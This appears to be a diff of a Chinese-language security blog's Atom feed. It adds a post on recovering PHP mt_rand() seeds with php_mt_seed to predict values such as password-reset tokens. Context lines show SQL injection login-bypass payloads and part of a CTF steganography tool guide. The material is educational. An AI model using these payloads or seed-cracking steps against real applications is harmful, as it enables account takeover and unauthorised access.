@@ -4,7 +4,7 @@
   
   <link href="/atom.xml" rel="self"/>
   <link href="http://yoursite.com/"/>
-  <updated>2016-09-10T06:15:55.935Z</updated>
+  <updated>2016-09-12T08:57:15.379Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,11 +15,33 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
+    <title><![CDATA[php随机数函数安全]]></title>
+    <link href="http://yoursite.com/2016/09/12/php%E9%9A%8F%E6%9C%BA%E6%95%B0%E5%87%BD%E6%95%B0%E5%AE%89%E5%85%A8/"/>
+    <id>http://yoursite.com/2016/09/12/php随机数函数安全/</id>
+    <published>2016-09-12T08:53:34.000Z</published>
+    <updated>2016-09-12T08:57:15.379Z</updated>
+    <content type="html"><![CDATA[<h1 id="0x00_rand_28_29_u51FD_u6570"><a href="#0x00_rand_28_29_u51FD_u6570" class="headerlink" title="0x00 rand()函数"></a>0x00 rand()函数</h1><p>rand()的随机数默认最大32767，可以用于爆破这里不再举例。</p>
+<h2 id="0x01_mt_rand_28_29_u548Cmt_srand_28_29_u51FD_u6570"><a href="#0x01_mt_rand_28_29_u548Cmt_srand_28_29_u51FD_u6570" class="headerlink" title="0x01 mt_rand()和mt_srand()函数"></a>0x01 mt_rand()和mt_srand()函数</h2><p>mt_srand()函数用于播种，PHP 4.2.0 起，不再需要用 srand() 或 mt_srand() 函数给随机数发生器播种，当PHP版本到了5.2.1后，通过修改算法修补了奇数和偶数的播种相等的问题，这样也导致了php5.2.0前后导致同一个播种后的mt_rand()的值不一样<br>5.2.6&gt;php&gt;4.2.0默认播种的算法也不是很强悍，当目标&gt;5.20时候，我们exp运行的环境也要是&gt;5.20的版本，mt_rand处理的数据都是不安全的。在web应用里很多都使用mt_rand来处理随机的session，比如密码找回功能等等。<br>如果你知道一个mt_rand()的值就可以，就可以推断出mt_srand()的种子值，从而推断出下一个mt_rand()值。<br>工具:<a href="http://download.openwall.net/pub/projects/php_mt_seed/php_mt_seed-3.2.tar.gz" target="_blank" rel="external">http://download.openwall.net/pub/projects/php_mt_seed/php_mt_seed-3.2.tar.gz</a></p>
+<p>root@kali:~# php5 -r ‘mt_srand(123123123); echo mt_rand(),”\n”; echo mt_rand(),”\n”;’<br>519979806<br>1474031914</p>
+<p>root@kali:~/php_mt_seed-3.2# ./php_mt_seed 519979806<br>Found 0, trying 100663296 - 134217727, speed 34831590 seeds per second<br>seed = 123123123<br>Found 1, trying 1509949440 - 1543503871, speed 34497359 seeds per second<br>seed = 1525862101<br>Found 2, trying 3992977408 - 4026531839, speed 34601190 seeds per second<br>seed = 3994356879<br>Found 3, trying 4261412864 - 4294967295, speed 34578163 seeds per second<br>Found 3</p>
+<p>可见程序给出了三个种子，逐个测试即可：<br>root@kali:~# php5 -r ‘mt_srand(1525862101); echo mt_rand(),”\n”; echo mt_rand(),”\n”;’<br>519979806<br>14803299<br>root@kali:~# php5 -r ‘mt_srand(3994356879); echo mt_rand(),”\n”; echo mt_rand(),”\n”;’<br>519979806<br>978260809</p>
+<p>123123123为真正的种子，这样就可以轻松拿到真正的种子，下一个要产生的随机数也就知道了</p>
+]]></content>
+    <summary type="html">
+    <![CDATA[rand() mt_rand() mt_srand()函数安全问题]]>
+    
+    </summary>
+    
+      <category term="php代码安全" scheme="http://yoursite.com/tags/php%E4%BB%A3%E7%A0%81%E5%AE%89%E5%85%A8/"/>
+    
+  </entry>
+  
+  <entry>
     <title><![CDATA[sql注入之最短姿势]]></title>
     <link href="http://yoursite.com/2016/09/10/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%9C%80%E7%9F%AD%E5%A7%BF%E5%8A%BF/"/>
     <id>http://yoursite.com/2016/09/10/sql注入之最短姿势/</id>
     <published>2016-09-10T06:07:34.000Z</published>
-    <updated>2016-09-10T06:15:55.935Z</updated>
+    <updated>2016-09-12T08:51:17.134Z</updated>
     <content type="html"><![CDATA[<h2 id="0x00__u59FF_u52BF"><a href="#0x00__u59FF_u52BF" class="headerlink" title="0x00 姿势"></a>0x00 姿势</h2><p>select <em> from user where id=’’=0# and password=’ad’<br>select </em> from user where id=’’ 返回为空 相当于0=0，即绕过了长短问题</p>
 <p>exp：<br>select * from user where id=’’&gt;-1# and password=’ad’      相当于0&gt;-1#</p>
 <p>利用符号<br>select <em> from users  where id=-0# and password=’ad’<br>select </em> from users where id=1&amp;0# and password=’ad’</p>
@@ -56,7 +78,7 @@
     <link href="http://yoursite.com/2016/09/08/ctf%E4%B9%8B%E9%9A%90%E5%86%99%E5%B7%A5%E5%85%B7%E7%AF%87/"/>
     <id>http://yoursite.com/2016/09/08/ctf之隐写工具篇/</id>
     <published>2016-09-08T05:33:35.000Z</published>
-    <updated>2016-09-10T06:14:53.931Z</updated>
+    <updated>2016-09-12T08:51:16.263Z</updated>
     <content type="html"><![CDATA[<h2 id="0x00_Stegdetect"><a href="#0x00_Stegdetect" class="headerlink" title="0x00 Stegdetect"></a>0x00 Stegdetect</h2><p>Stegdetect程序主要用于分析JPEG文件，可以检测到通过JSteg、JPHide、OutGuess、Invisible Secrets、F5、appendX和Camouflage等这些隐写工具隐藏的信息</p>
 <h3 id="1_uFF0C_u5B89_u88C5"><a href="#1_uFF0C_u5B89_u88C5" class="headerlink" title="1，安装"></a>1，安装</h3><p>windows安装文件我没找到。我在kali安装Stegdetect比较简单<br>apt-get install stegdetect<br>OutGuess安装：<a href="https://github.com/crorvick/outguess.git" target="_blank" rel="external">https://github.com/crorvick/outguess.git</a><br>./configure &amp;&amp; make &amp;&amp; make install<br>Stegdetect通过统计测试来分析图像文件中是否包含隐藏内容。它运行静态测试以判断隐藏的内容是否存在。此外，它还会尝试识别隐藏内容是通过哪个隐写工具嵌入的。</p>
 <h3 id="2_uFF0CStegdetect_u7684_u4E3B_u8981_u9009_u9879_u5982_u4E0B_uFF1A"><a href="#2_uFF0CStegdetect_u7684_u4E3B_u8981_u9009_u9879_u5982_u4E0B_uFF1A" class="headerlink" title="2，Stegdetect的主要选项如下："></a>2，Stegdetect的主要选项如下：</h3><pre><code>q – 仅显示可能包含隐藏内容的图像
